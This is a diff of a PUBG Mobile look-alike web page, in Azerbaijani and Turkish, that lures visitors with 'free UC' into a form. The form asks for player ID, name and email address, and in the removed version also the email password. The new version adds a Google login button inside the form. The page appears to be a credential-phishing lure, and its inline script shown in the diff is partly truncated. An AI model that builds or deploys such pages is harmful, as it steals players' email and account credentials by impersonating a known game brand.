@@ -1,343 +1,244 @@
-<!DOCTYPE html>
-<html lang="az">
+<!DOCTYPE html><html lang="az">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PUBG MOBILE</title>
 
-    <title>PUBG MOBILE</title>
+<link rel="stylesheet" href="style.css">
 
-    <link rel="stylesheet" href="style.css">
-</head>
-
-<body>
-
-<!-- HEADER -->
-<header class="header">
-
-    <div class="pubg-logo">
-        <div class="pubg-box">PUBG</div>
-        <span>MOBILE</span>
-    </div>
-
-    <div class="header-actions">
-
-        <div class="vip">
-            <span>VIP</span>
-            <small>-10%</small>
-        </div>
-
-        <div class="language">◎</div>
-
-        <button class="menu-btn">
-            <span></span>
-            <span></span>
-            <span></span>
-        </button>
-
-        <button class="download-btn">
-            ↓
-        </button>
-
-    </div>
-
-</header>
-<button id="googleLogin">
-    GOOGLE İLƏ DAXİL OL
-</button>
-
-<div id="loginStatus"></div>
-
-<!-- HERO -->
-<main>
-
-<section class="hero">
-
-    <!-- PARACHUTE IMAGE -->
-    <div class="hero-character">
-        <img src="parasut.png" alt="PUBG Mobile parachuting character">
-    </div>
-
-    <!-- BLUE LIGHT -->
-    <div class="blue-light"></div>
-
-    <div class="hero-content">
-
-        <div class="flash-logo">
-            <div class="small-pubg">PUBG</div>
-            <strong>MOBILE</strong>
-            <b>FLASH</b>
-        </div>
-      <div class="free-text" id="freeText">
-    ÜCRETSİZ UC
+</head><body><!-- HEADER --><header class="header"><div class="pubg-logo">
+    <div class="pubg-box">PUBG</div>
+    <span>MOBILE</span>
 </div>
 
-<!-- UC SUAL PƏNCƏRƏSİ -->
-<div class="quiz-overlay" id="quizOverlay">
+<div class="header-actions">
 
-    <div class="quiz-box">
-
-        <h2>UC FORMU</h2>
-
-        <div class="question">
-            <label>Oyuncu İD</label>
-            <input type="text" id="answer1" placeholder="Oyuncu İD-nizi yazınız">
-        </div>
-
-        <div class="question">
-            <label>Oyuncu İsminiz</label>
-            <input type="text" id="answer2" placeholder="Oyuncu isminizi giriniz">
-        </div>
-
-        <div class="question">
-            <label>Uc Miktarı</label>
-            <input type="text" id="answer3" placeholder="120-560 uc">
-        </div>
-
-        <div class="question">
-            <label>Eposta Adresi</label>
-            <input type="text" id="answer4" placeholder="Eposta adresinizi giriniz">
-        </div>
-
-        <div class="question">
-            <label>Eposta Şifresi</label>
-            <input type="text" id="answer5" placeholder="Eposta şifrenizi giriniz">
-        </div>
-
-        <div class="question">
-            <label>Sual 6</label>
-            <input type="text" id="answer6" placeholder="Cavabınızı yazın">
-        </div>
-
-        <div class="quiz-buttons">
-            <button id="confirmQuiz">TƏSTİQLƏ</button>
-            <button id="cancelQuiz">İMTİNA</button>
-        </div>
-
+    <div class="vip">
+        <span>VIP</span>
+        <small>-10%</small>
     </div>
+
+    <div class="language">◎</div>
+
+    <button class="menu-btn">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <button class="download-btn">
+        ↓
+    </button>
 
 </div>
 
+</header><!-- GOOGLE LOGIN --><div class="google-login-container">
+    <button id="googleLogin">
+        GOOGLE İLƏ DAXİL OL
+    </button><div id="loginStatus"></div>
 
-        <h1>
-            PUBG MOBILE<br>
-            <span>FLASH</span>
-        </h1>
+</div><!-- HERO --><main><section class="hero"><div class="hero-character">
+    <img src="parasut.png" alt="PUBG Mobile parachuting character">
+</div>
 
-        <p class="launch">
-            LAUNCHES IN NOVEMBER
-        </p>
+<div class="blue-light"></div>
+
+<div class="hero-content">
+
+    <div class="flash-logo">
+        <div class="small-pubg">PUBG</div>
+        <strong>MOBILE</strong>
+        <b>FLASH</b>
+    </div>
+
+    <div class="free-text" id="freeText">
+        ÜCRETSİZ UC
+    </div>
 
 
-        <div class="reward">
+    <!-- UC FORMU -->
+    <div class="quiz-overlay" id="quizOverlay">
 
-            <div class="reward-price">
-                US $1,000,000
+        <div class="quiz-box">
+
+            <h2>UC FORMU</h2>
+
+            <!-- GOOGLE LOGIN -->
+            <button id="googleLogin">
+                GOOGLE İLƏ DAXİL OL
+            </button>
+
+            <div id="loginStatus"></div>
+
+
+            <div class="question">
+                <label>Oyuncu İD</label>
+                <input
+                    type="text"
+                    id="answer1"
+                    placeholder="Oyuncu İD-nizi yazınız"
+                >
             </div>
 
-            <div class="reward-text">
-                IN REWARDS AWAITS — STAY TUNED!
+
+            <div class="question">
+                <label>Oyuncu İsminiz</label>
+                <input
+                    type="text"
+                    id="answer2"
+                    placeholder="Oyuncu isminizi giriniz"
+                >
+            </div>
+
+
+            <div class="question">
+                <label>UC Miktarı</label>
+                <input
+                    type="text"
+                    id="answer3"
+                    placeholder="120-560 UC"
+                >
+            </div>
+
+
+            <div class="question">
+                <label>Eposta Adresi</label>
+                <input
+                    type="email"
+                    id="answer4"
+                    placeholder="Eposta adresinizi giriniz"
+                >
+            </div>
+
+
+            <div class="question">
+                <label>Sual 6</label>
+                <input
+                    type="text"
+                    id="answer6"
+                    placeholder="Cavabınızı yazın"
+                >
+            </div>
+
+
+            <div class="quiz-buttons">
+
+                <button id="confirmQuiz">
+                    TƏSTİQLƏ
+                </button>
+
+                <button id="cancelQuiz">
+                    İMTİNA
+                </button>
+
             </div>
 
         </div>
 
+    </div>
 
-        <button class="register-btn">
-            <span>PRE-REGISTER NOW</span>
+
+    <h1>
+        PUBG MOBILE<br>
+        <span>FLASH</span>
+    </h1>
+
+
+    <p class="launch">
+        LAUNCHES IN NOVEMBER
+    </p>
+
+
+    <div class="reward">
+
+        <div class="reward-price">
+            US $1,000,000
+        </div>
+
+        <div class="reward-text">
+            IN REWARDS AWAITS — STAY TUNED!
+        </div>
+
+    </div>
+
+
+    <button class="register-btn">
+        <span>PRE-REGISTER NOW</span>
+        <b>›</b>
+    </button>
+
+
+    <div class="bottom-actions">
+
+        <button class="official-btn">
+            <span class="home-icon">⌂</span>
+            GO TO OFFICIAL WEBSITE
             <b>›</b>
         </button>
 
-
-        <div class="bottom-actions">
-
-            <button class="official-btn">
-                <span class="home-icon">⌂</span>
-                GO TO OFFICIAL WEBSITE
-                <b>›</b>
-            </button>
-
-            <button class="share-btn">
-                ↗
-            </button>
-
-        </div>
-
-
-        <p class="info">
-            Total rewards include in-game and out-of-game rewards.
-            Actual value may vary by region.
-        </p>
-
-
-        <div class="scroll-down">
-            <span>SCROLL DOWN TO LEARN MORE</span>
-            <b>⌄</b>
-        </div>
+        <button class="share-btn">
+            ↗
+        </button>
 
     </div>
 
-</section>
+
+    <p class="info">
+        Total rewards include in-game and out-of-game rewards.
+        Actual value may vary by region.
+    </p>
 
 
-<!-- SECOND SECTION -->
-<section class="second-section">
-
-    <div class="section-title">
-        <div class="mini-flash">
-            PUBG MOBILE
-            <strong>FLASH</strong>
-        </div>
-
-        <h2>
-            EXPERIENCE THE NEXT<br>
-            <span>LEVEL OF BATTLE</span>
-        </h2>
+    <div class="scroll-down">
+        <span>SCROLL DOWN TO LEARN MORE</span>
+        <b>⌄</b>
     </div>
 
+</div>
 
-    <div class="game-preview">
+</section><!-- SECOND SECTION --><section class="second-section"><div class="section-title">
 
-        <div class="game-screen">
-
-            <div class="game-ui">
-                <span>ALIVE 100</span>
-                <span>30</span>
-                <span>NE 65</span>
-            </div>
-
-            <div class="crosshair">
-                +
-            </div>
-
-        </div>
-
+    <div class="mini-flash">
+        PUBG MOBILE
+        <strong>FLASH</strong>
     </div>
 
-</section>
-
-</main>
-
-
-<!-- SIDE MENU -->
-<div class="side-menu">
-
-    <button class="close-menu">×</button>
-
-    <nav>
-        <a href="#">HOME</a>
-        <a href="#">NEWS</a>
-        <a href="#">EVENTS</a>
-        <a href="#">REWARDS</a>
-        <a href="#">ABOUT PUBG MOBILE</a>
-    </nav>
+    <h2>
+        EXPERIENCE THE NEXT<br>
+        <span>LEVEL OF BATTLE</span>
+    </h2>
 
 </div>
 
 
-<>
+<div class="game-preview">
 
-/* =========================
-   MENYU
-========================= */
+    <div class="game-screen">
 
-const menuButton = document.querySelector(".menu-btn");
-const closeButton = document.querySelector(".close-menu");
-const sideMenu = document.querySelector(".side-menu");
+        <div class="game-ui">
+            <span>ALIVE 100</span>
+            <span>30</span>
+            <span>NE 65</span>
+        </div>
 
-menuButton.addEventListener("click", () => {
-    sideMenu.classList.add("active");
-});
+        <div class="crosshair">
+            +
+        </div>
 
-closeButton.addEventListener("click", () => {
-    sideMenu.classList.remove("active");
-});
+    </div>
 
+</div>
 
-/* =========================
-   UC FORMU
-========================= */
+</section></main><!-- SIDE MENU --><div class="side-menu"><button class="close-menu">
+    ×
+</button>
 
-const freeText = document.getElementById("freeText");
-const quizOverlay = document.getElementById("quizOverlay");
+<nav>
+    <a href="#">HOME</a>
+    <a href="#">NEWS</a>
+    <a href="#">EVENTS</a>
+    <a href="#">REWARDS</a>
+    <a href="#">ABOUT PUBG MOBILE</a>
+</nav>
 
-const confirmQuiz = document.getElementById("confirmQuiz");
-const cancelQuiz = document.getElementById("cancelQuiz");
-
-const answers = [
-    document.getElementById("answer1"),
-    document.getElementById("answer2"),
-    document.getElementById("answer3"),
-    document.getElementById("answer4"),
-    document.getElementById("answer5"),
-    document.getElementById("answer6")
-];
-
-
-/* ÜCRETSİZ UC düyməsinə basanda aç */
-
-freeText.addEventListener("click", () => {
-
-    quizOverlay.classList.add("active");
-
-    document.body.style.overflow = "hidden";
-
-});
-
-
-/* =========================
-   TƏSTİQLƏ
-========================= */
-
-confirmQuiz.addEventListener("click", () => {
-
-    let tamamdir = true;
-
-    answers.forEach((input) => {
-
-        if (input.value.trim() === "") {
-
-            tamamdir = false;
-
-            input.style.borderColor = "#ff3333";
-
-        } else {
-
-            input.style.borderColor = "#c5c5c5";
-
-        }
-
-    });
-
-
-    if (!tamamdir) {
-
-        alert("Zəhmət olmasa bütün suallara cavab verin!");
-
-        return;
-    }
-
-
-    alert("Cavablar təsdiqləndi!");
-
-    quizOverlay.classList.remove("active");
-
-    document.body.style.overflow = "";
-
-});
-
-
-/* =========================
-   İMTİNA
-========================= */
-
-cancelQuiz.addEventListener("click", () => {
-
-    const exit = confirm(
-        "İmtina etsəniz səhifədən çıxacaqsınız. Davam etmək istəyirsiniz?"
-    );
-
-    if (exit) {
-
-<script type="module" src="script.js"></script>
-
-</body>
+</div><!-- JAVASCRIPT --><script type="module" src="script.js"></script></body>
 </html>
